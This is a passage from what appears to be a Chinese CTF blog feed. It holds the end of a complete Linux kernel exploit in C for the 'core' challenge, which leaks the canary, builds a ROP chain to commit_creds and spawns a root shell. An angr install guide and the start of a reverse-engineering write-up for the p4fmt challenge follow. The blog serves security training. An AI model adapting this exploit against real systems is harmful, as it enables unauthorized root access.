class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_READ  0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_SET   0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags,user_sp;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"popq %3\n"</span></span><br><span class="line">    : <span class="string">"=r"</span> (user_cs), <span class="string">"=r"</span> (user_ss),<span class="string">"=r"</span>(user_sp),<span class="string">"=r"</span> (user_rflags) : : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()&#123;</span><br><span class="line">    FILE * fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open /proc/core error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,CORE_SET, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,CORE_READ, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b1_&gt;0x%lx\n"</span>,<span class="number">0xffffffff81a012da</span> + offset);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[i++] = getuid;</span><br><span class="line">    </span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;         <span class="comment">// rip </span></span><br><span class="line">    </span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd,CORE_WRITE, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-2/" target="_blank" rel="noopener">M4x</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="linux kernel pwn" scheme="https://leave-Devour.github.io/tags/linux-kernel-pwn/"/>
    
  </entry>
  
  <entry>
    <title>angr安装</title>
    <link href="https://leave-devour.github.io/2020/02/12/angr%E5%AE%89%E8%A3%85/"/>
    <id>https://leave-devour.github.io/2020/02/12/angr%E5%AE%89%E8%A3%85/</id>
    <published>2020-02-12T11:35:31.000Z</published>
    <updated>2020-04-02T08:17:41.112Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="首先安装运行的虚拟环境"><a href="#首先安装运行的虚拟环境" class="headerlink" title="首先安装运行的虚拟环境"></a>首先安装运行的虚拟环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-virtualenv</span><br><span class="line">sudo pip install virtualenvwrapper</span><br><span class="line">python的版本没有3.6以上的好像有个模块不支持，成不了。所以建议用python3.6以上的版本编译</span><br></pre></td></tr></table></figure><h3 id="查找virtualenvwrapper-sh的路径"><a href="#查找virtualenvwrapper-sh的路径" class="headerlink" title="查找virtualenvwrapper.sh的路径"></a>查找virtualenvwrapper.sh的路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><h3 id="修改环境变量"><a href="#修改环境变量" class="headerlink" title="修改环境变量"></a>修改环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="然后创建一个环境，再安装angr"><a href="#然后创建一个环境，再安装angr" class="headerlink" title="然后创建一个环境，再安装angr"></a>然后创建一个环境，再安装angr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv angr</span><br><span class="line">sudo pip3 install angr</span><br></pre></td></tr></table></figure><p>这样就成功了</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="pip：Import-Error-cannot-import-name-main"><a href="#pip：Import-Error-cannot-import-name-main" class="headerlink" title="pip：Import Error:cannot import name main"></a>pip：Import Error:cannot import name main</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方案</span><br><span class="line">1、 from pip._internal import main</span><br><span class="line">2、 </span><br><span class="line">from pip import __main__</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><h4 id="TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’"><a href="#TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’" class="headerlink" title="TypeError: new() got an unexpected keyword argument ‘serialized_options’"></a>TypeError: <strong>new</strong>() got an unexpected keyword argument ‘serialized_options’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在终端上的 protoc 版本 与pycharm 中用conda 安装的protobuf版本不一样。</span><br><span class="line">然后在终端上进行proto文件编译，在pycharm上运行相关脚本，出现以上错误。</span><br><span class="line">在pycharm中调整protobuf的版本后错误消失。</span><br><span class="line">pip uninstall protobuf</span><br><span class="line">pip install protobuf</span><br></pre></td></tr></table></figure><h4 id="遇到pdr无法安装"><a href="#遇到pdr无法安装" class="headerlink" title="遇到pdr无法安装"></a>遇到pdr无法安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手动安装一下就ok</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="tools" scheme="https://leave-Devour.github.io/categories/tools/"/>
    
    
      <category term="Automation" scheme="https://leave-Devour.github.io/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>p4fmt TeaserCONFidence2019 CTF </title>
    <link href="https://leave-devour.github.io/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/"/>
    <id>https://leave-devour.github.io/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/</id>
    <published>2020-02-12T05:11:09.000Z</published>
    <updated>2020-02-12T15:24:16.606Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>有三个文件<br><code>bzImage  initramfs.cpio.gz  run.sh</code><br>run.sh:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1   │ #!/bin/bash</span><br><span class="line">2   │ qemu-system-x86_64 -kernel ./bzImage \</span><br><span class="line">3   │         -initrd ./initramfs.cpio.gz \</span><br><span class="line">4   │         -nographic \</span><br><span class="line">5   │         -append &quot;console=ttyS0&quot; \</span><br></pre></td></tr></table></figure><p>启动qemu脚本，里面有给的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">====================</span><br><span class="line">p4fmt</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&apos;re stuck with copy pasting base64&apos;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&apos;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&apos;s time to prove your skills.</span><br></pre></td></tr></table></figure><p>可以看到，这个说给出了一个新的<code>二进制格式</code><br>目录下面有一个 <code>p4fmt.ko</code><br>p4fmt.ko</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">里面注册了四个函数</span><br><span class="line">load_p4_binary</span><br><span class="line">load_p4_binary_cold_2</span><br><span class="line">p4fmt_init</span><br><span class="line">p4fmt_exit</span><br></pre></td></tr></table></figure><p>p4fmt_init 和 p4fmt_exit 分别注册和注销 一个文件格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">p4fmt_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _register_binfmt(&amp;p4format, <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line">__<span class="function">int64 <span class="title">p4fmt_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> unregister_binfmt(&amp;p4format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看 load_p4_binary_cold_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:000000000000018E load_p4_binary_cold_2 proc near         ; CODE XREF: load_p4_binary:loc_47↑j</span><br><span class="line">.text.unlikely:000000000000018E                 mov     rdi, offset unk_275</span><br><span class="line">.text.unlikely:0000000000000195                 mov     ebp, 0FFFFFFF8h</span><br><span class="line">.text.unlikely:000000000000019A                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000019F                 jmp     loc_65</span><br><span class="line">.text.unlikely:000000000000019F load_p4_binary_cold_2 endp</span><br><span class="line"></span><br><span class="line">.rodata.str1.1:0000000000000275 unk_275         db    1                 ; DATA XREF: load_p4_binary_cold_2↑o</span><br><span class="line">.rodata.str1.1:0000000000000276                 db  37h ; 7</span><br><span class="line">.rodata.str1.1:0000000000000277                 db  55h ; U</span><br><span class="line">.rodata.str1.1:0000000000000278                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000279                 db  6Bh ; k</span><br><span class="line">.rodata.str1.1:000000000000027A                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027B                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:000000000000027C                 db  77h ; w</span><br><span class="line">.rodata.str1.1:000000000000027D                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027E                 db  20h</span><br><span class="line">.rodata.str1.1:000000000000027F                 db  76h ; v</span><br><span class="line">.rodata.str1.1:0000000000000280                 db  65h ; e</span><br><span class="line">.rodata.str1.1:0000000000000281                 db  72h ; r</span><br><span class="line">.rodata.str1.1:0000000000000282                 db  73h ; s</span><br><span class="line">.rodata.str1.1:0000000000000283                 db  69h ; i</span><br><span class="line">.rodata.str1.1:0000000000000284                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:0000000000000285                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000286                 db  0Ah</span><br><span class="line">.rodata.str1.1:0000000000000287                 db    0</span><br><span class="line">.rodata.str1.1:0000000000000287 _rodata_str1_1  ends</span><br><span class="line"></span><br><span class="line">明显这个是一个版本错误的info</span><br><span class="line">然后退出</span><br></pre></td></tr></table></figure><p>想来这个load_p4_binary才是关键的，仔细看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000                 push    r15</span><br><span class="line">.text:0000000000000002                 mov     ecx, 2</span><br><span class="line">.text:0000000000000007                 mov     rsi, offset P4 \\P4，相当于一个magic </span><br><span class="line">.text:000000000000000E                 push    r14</span><br><span class="line">.text:0000000000000010                 push    r13</span><br><span class="line">.text:0000000000000012                 push    r12</span><br><span class="line">.text:0000000000000014                 lea     r12, [rdi+48h]</span><br><span class="line">.text:0000000000000018                 push    rbp</span><br><span class="line">.text:0000000000000019                 push    rbx</span><br><span class="line">.text:000000000000001A                 mov     rbx, rdi</span><br><span class="line">.text:000000000000001D                 mov     rdi, r12</span><br><span class="line">.text:0000000000000020                 mov     r14, gs:current_task</span><br><span class="line">.text:0000000000000029                 sub     rsp, 8</span><br><span class="line">.text:000000000000002D                 mov     r13, [r14+2A0h]</span><br><span class="line">.text:0000000000000034                 repe cmpsb</span><br><span class="line">.text:0000000000000036                 setnbe  al      \\ 从 0x48开始判断，这里判断前面两字节是否相等</span><br><span class="line">.text:0000000000000039                 sbb     al, 0</span><br><span class="line">.text:000000000000003B                 test    al, al</span><br><span class="line">.text:000000000000003D                 jnz     loc_184</span><br><span class="line">.text:0000000000000043                 cmp     byte ptr [rbx+4Ah], 0 \\这些判断版本是否正确，version = 0</span><br><span class="line">.text:0000000000000047</span><br><span class="line">.text:0000000000000047 loc_47:</span><br><span class="line">.text:0000000000000047                 jnz     load_p4_binary_cold_2</span><br><span class="line">.text:000000000000004D                 cmp     byte ptr [rbx+4Bh], 1 \\ 0x4b这个byte 不能大于1</span><br><span class="line">.text:0000000000000051                 ja      loc_17A</span><br><span class="line">.text:0000000000000057                 mov     rdi, rbx</span><br><span class="line">.text:000000000000005A                 call    flush_old_exec  ; PIC mode</span><br><span class="line"></span><br><span class="line">flush_old_exec:</span><br><span class="line">停止当前进程内的所有线程，清空当前内存空间，重置各种状态</span><br></pre></td></tr></table></figure><p>接下来有两种处理方式，由<code>0x4b</code>byte 决定,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v6 + <span class="number">0x80</span>) = <span class="number">0x800000</span>;</span><br><span class="line">setup_new_exec(v4); <span class="comment">//</span></span><br><span class="line">v12 = *(_BYTE *)(v4 + <span class="number">75</span>); \\ <span class="number">0x4b</span> == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) ) </span><br><span class="line">      &#123;<span class="comment">//  v3 = a1 + 0x48;</span></span><br><span class="line">        v16 = (__int64 *)(*(_QWORD *)(v4 + <span class="number">80</span>) + v3); <span class="comment">//  0x50 是一个偏移，</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = *v16;  <span class="comment">// v16 指向一个信息chunk</span></span><br><span class="line">          v18 = *v16 &amp; <span class="number">7</span>;</span><br><span class="line">          v19 = *v16 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;       <span class="comment">// load_addr </span></span><br><span class="line">          printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, v19, v16[<span class="number">1</span>], v16[<span class="number">2</span>], v18);</span><br><span class="line">          v20 = v16[<span class="number">2</span>];</span><br><span class="line">          v21 = v16[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span 